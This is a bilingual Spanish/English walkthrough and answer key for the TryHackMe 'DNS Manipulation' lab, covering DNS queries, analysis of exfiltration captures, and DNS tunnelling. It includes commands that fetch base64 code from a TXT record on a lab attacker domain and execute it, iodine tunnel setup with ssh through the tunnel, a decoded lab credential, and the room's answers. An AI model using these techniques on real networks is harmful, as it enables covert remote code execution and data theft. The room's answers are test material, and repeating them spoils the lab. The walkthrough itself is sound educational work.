# DNS Manipulation

| Dificultad | Tipo | Slug | Link | Sección | Fuente | Componentes | Impacto |
|---|---|---|---|---|---|---|---|
| Easy | walkthrough | `dnsmanipulation` | [TryHackMe](https://tryhackme.com/room/dnsmanipulation) | 01 Level Easy | TryHackMe | DNS / registros DNS (TXT, AAAA, PTR) / exfiltración / infiltración / tunneling con iodine / tshark | Comprender cómo se puede abusar del DNS para exfiltrar, infiltrar y hacer tunneling de datos. |

> **Objeto:** Aprender las técnicas de manipulación del DNS: escribir consultas con `nslookup` y `dig`, abusar de los registros TXT para exfiltración e infiltración de datos, y crear túneles DNS (iodine) que permitan una comunicación oculta a través del protocolo.

---

**Contexto:** El DNS transporta muchísimo tráfico y rara vez se inspecciona a fondo, lo que lo convierte en un canal perfecto para que un atacante comunique datos fuera de la red sin levantar sospechas. La room recorre los comandos básicos de consulta (`dig`, `nslookup`), los registros relevantes (TXT, AAAA, PTR), la **exfiltración** (mandar datos de la víctima a un servidor atacante por DNS), la **infiltración** (mandar código al exterior y recibir respuestas) y el **tunneling** completo con iodine.

> **ES:** El DNS apenas se inspecciona, por lo que es un canal ideal para ocultar comunicaciones. Se aprende a consultar registros (TXT, AAAA, PTR) con dig/nslookup, a extraer datos con exfiltración DNS (TXT, subdominios, base64, PTR), a filtrar e interpretar el tráfico con tshark y packetyGrabber, a usar infiltración DNS para descargar y ejecutar código remoto, y a montar un túnel completo con iodine para navegar a través de la máquina víctima.
> **EN:** DNS is rarely inspected, making it an ideal covert channel. You learn to query records (TXT, AAAA, PTR) with dig/nslookup, to exfiltrate data via DNS (TXT records, subdomains, base64, PTR), to capture and decode traffic with tshark and packetyGrabber, to use DNS infiltration to download and execute remote code, and to build a full tunnel with iodine to browse through the victim machine.

## Solucionario

### Task 1: Introducción / Introduction
**Explicación:** Tarea de presentación de la room. Se despliega la máquina de atacante y la máquina víctima del laboratorio.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Read the above. / Lee el contenido de la tarea. | `No answer needed` |

### Task 2: ¿Qué es el DNS? / What is DNS?
**Explicación:** Recuerda qué es el DNS y sus mecanismos de consulta en Windows y Linux. La respuesta se obtiene consultando registros TXT, AAAA y PTR, y construyendo el reverse-lookup correcto de una dirección IPv4. También se limita a 256 caracteres lo que MUCHOS servidores/de código creen que es el límite para un registro TXT (en realidad los registros TXT pueden superarlo, de ahí la respuesta Nay).

```bash
dig facebook.com TXT              # consultar un registro TXT en Linux
nslookup -type=txt youtube.com    # consultar un registro TXT en Windows
dig +short AAAA example.com       # ver el registro AAAA (IPv6)
dig -x 192.168.203.2              # reverse-lookup de una IP
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | If you were on Windows, what command could you use to query a txt record for 'youtube.com'? / ¿Qué comando usarías en Windows para consultar un registro txt de 'youtube.com'? | `nslookup -type=txt youtube.com` |
| 2 | If you were on Linux, what command could you use to query a txt record for 'facebook.com'? / ¿Qué comando usarías en Linux para consultar un registro txt de 'facebook.com'? | `dig facebook.com TXT` |
| 3 | AAAA stores what type of IP Address along with the hostname? / ¿Qué tipo de dirección IP guarda el registro AAAA junto al hostname? | `IPv6` |
| 4 | Maximum characters for a DNS TXT Record is 256. (Yay/Nay) / El máximo de caracteres de un registro TXT es 256. (Yay/Nay) | `Nay` |
| 5 | What DNS Record provides a domain name in reverse-lookup? / ¿Qué registro DNS proporciona el nombre de dominio en la búsqueda inversa? | `PTR` |
| 6 | What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) / ¿Cuál sería el reverse-lookup de la siguiente dirección IPv4? (192.168.203.2) | `2.203.168.192.in-addr.arpa` |

### Task 3: Exfiltración DNS / DNS Exfiltration
**Explicación:** La exfiltración por DNS consiste en enviar datos de la víctima al servidor del atacante codificados en las consultas (subdominios, registros TXT, PTR) o en archivos pcap. Se recuerda el límite de 253 caracteres para un nombre de dominio completo.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the maximum length of a DNS name? / ¿Cuál es la longitud máxima de un nombre de dominio DNS? | `253` |

### Task 4: Práctica de exfiltración - Lista de pedidos / DNS Exfiltration Practice - Orderlist
**Explicación:** En una captura de un ataque real de exfiltración por DNS se extraen los datos que un empleado envió por el canal DNS. Se analiza el pcap con tshark para reconstruir la lista de pedidos oculta: la transacción se llama Network Equip. y el firewall costó 2500.

```bash
tshark -r capture.pcap            # análisis básico de la captura
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the Transaction name? / ¿Cuál es el nombre de la transacción? | `Network Equip.` |
| 2 | How much was the Firewall? / ¿Cuánto costó el Firewall? | `2500` |

### Task 5: Práctica de exfiltración - Identidad / DNS Exfiltration Practice - Identity
**Explicación:** En la misma captura se buscan las consultas DNS sospechosas (archivo cap3.pcap) y se decodifican con la herramienta packetyGrabber.py del directorio ~/dns-exfil-infil/ (la flag estará en el resultado del script o en la respuesta decodificada), obteniendo las credenciales exfiltradas del empleado.

```bash
tshark -r identity.pcap           # análisis detallado de la captura
python3 packetyGrabber.py         # decodificar los datos exfiltrados
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Which file contains suspicious DNS queries? / ¿Qué archivo contiene las consultas DNS sospechosas? | `cap3.pcap` |
| 2 | Enter the plain-text after you have decoded the data using packetyGrabber.py found in ~/dns-exfil-infil/ folder. / Introduce el texto plano tras decodificar los datos con packetyGrabber.py de la carpeta ~/dns-exfil-infil/. | `administrator:s3cre7P@ssword` |

### Task 6: Infiltración DNS / DNS Infiltration
**Explicación:** La infiltración es el proceso inverso: el atacante responde a las consultas DNS de la víctima con datos codificados (por ejemplo, base64 en un registro TXT) que la víctima decodifica y ejecuta. Así se puede entregar código o herramientas sin usar HTTP/SMB.

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | Read the above. / Lee el contenido de la tarea. | `No answer needed` |

### Task 7: Práctica de infiltración / DNS Infiltration - Practice
**Explicación:** Se solicita el registro TXT de code.badbaddoma.in (contiene el código en base64), se convierte el texto en un archivo de Python y se ejecuta con packetySimple.py. La salida del script es la versión del kernel Ubuntu de la víctima.

```bash
nslookup code.badbaddoma.in        # obtener el valor base64 del código
python3 packetySimple.py in.txt out.py   # convertir y generar el script
python3 out.py                     # ejecutar el código infiltrado
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What is the DNS record type used to retrieve the payload? / ¿Qué tipo de registro DNS se usa para recuperar el payload? | `TXT` |
| 2 | Save the text value to a python file, run packetySimple.py and execute the program. / Guarda el valor de texto en un archivo, ejecuta packetySimple.py y ejecuta el programa. | `No answer needed` |
| 3 | Enter the output from the executed python file. / Introduce la salida del archivo de Python ejecutado. | `4.4.0-186-generic` |

### Task 8: Tunneling DNS / DNS Tunneling
**Explicación:** El tunneling con iodine monta una interfaz de red virtual (t0) sobre el protocolo DNS, creando un canal bidireccional con el servidor del atacante. Se instala y prueba contra la máquina víctima.

```bash
apt install iodine                  # instalar la herramienta en el servidor
iodined -fP password t0 tunnel.bhbdomain.co.uk   # levantar el servidor (dominio del laboratorio)
iodine -P password tunnel.bhbdomain.co.uk        # cliente en la máquina víctima
ssh root@10.1.1.1                   # acceder a través del túnel
```

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | What tool is used to create the DNS tunnel in the demo? / ¿Qué herramienta se usa para crear el túnel DNS de la demo? | `iodine` |
| 2 | Read the above and practice creating a DNS tunnel. / Lee el contenido y practica la creación de un túnel DNS. | `No answer needed` |

---

| # | Pregunta | Respuesta |
|---|----------|-----------|
| 1 | If you were on Windows, what command could you use to query a txt record for 'youtube.com'? | `nslookup -type=txt youtube.com` |
| 2 | If you were on Linux, what command could you use to query a txt record for 'facebook.com'? | `dig facebook.com TXT` |
| 3 | AAAA stores what type of IP Address along with the hostname? | `IPv6` |
| 4 | Maximum characters for a DNS TXT Record is 256. (Yay/Nay) | `Nay` |
| 5 | What DNS Record provides a domain name in reverse-lookup? | `PTR` |
| 6 | What would the reverse-lookup be for the following IPv4 Address? (192.168.203.2) | `2.203.168.192.in-addr.arpa` |
| 7 | What is the maximum length of a DNS name? | `253` |
| 8 | What is the Transaction name? | `Network Equip.` |
| 9 | How much was the Firewall? | `2500` |
| 10 | Which file contains suspicious DNS queries? | `cap3.pcap` |
| 11 | Enter the plain-text after you have decoded the data using packetyGrabber.py found in ~/dns-exfil-infil/ folder. | `administrator:s3cre7P@ssword` |
| 12 | What is the DNS record type used to retrieve the payload? | `TXT` |
| 13 | Enter the output from the executed python file. | `4.4.0-186-generic` |
| 14 | What tool is used to create the DNS tunnel in the demo? | `iodine` |

---

**Metodología:** Se repasan los comandos de consulta DNS (`nslookup`/`dig`) y los registros TXT, AAAA y PTR. Después se analizan capturas pcap reales de ataques DNS con `tshark` y `packetyGrabber.py` para reconstruir datos exfiltrados (pedidos, identidad y credenciales), se practica la infiltración descargando código base64 vía registro TXT y convirtiéndolo con `packetySimple.py`, y finalmente se monta un túnel con `iodine` para establecer un canal de comunicación completo sobre DNS.

### Cadena de ataque / Attack Chain

```text
Consulta DNS (dig/nslookup TXT) -> exfiltración de datos en consultas DNS -> captura pcap (tshark) -> decodificado (packetyGrabber) -> credenciales del empleado -> infiltración (base64 en TXT + packetySimple) -> ejecución de código remoto -> tunneling con iodine -> acceso a la víctima a través del canal DNS
```

**Learning chain:** What is DNS --> DNS Exfiltration --> Orderlist (tshark) --> Identity (packetyGrabber) --> DNS Infiltration --> Practice (packetySimple) --> DNS Tunneling (iodine).

**Lección:** *El DNS no se limita a resolver nombres: al apenas inspeccionarse, permite exfiltración, infiltración y tunneling de datos. Todo analista o SOC debe vigilar el volumen y el contenido de las consultas DNS salientes.*

**MITRE ATT&CK:** N/A (room de técnicas de exfiltración/infiltración por DNS)

**Fuente:** [TryHackMe - DNS Manipulation](https://tryhackme.com/room/dnsmanipulation)

---

## ⚠️ Descargo de Responsabilidad (Disclaimer)

Este contenido se presenta exclusivamente con fines académicos y educativos.

**Sin Afiliación:** Este espacio no posee ninguna alianza, asociación, patrocinio ni vinculación oficial con TryHackMe.
**Veracidad de los Datos:** La información aquí contenida tiene un propósito ilustrativo y formativo. Los datos, políticas, precios o características de los servicios mencionados pueden variar y no son decididos por TryHackMe en este contexto.
**Referencia Oficial:** Para obtener información precisa, oficial y actualizada, se recomienda encarecidamente visitar el sitio web oficial de TryHackMe (https://tryhackme.com).
**Uso Ético:** No fomentamos ni nos responsabilizamos por el uso indebido de esta información fuera de fines educativos o profesionales legítimos.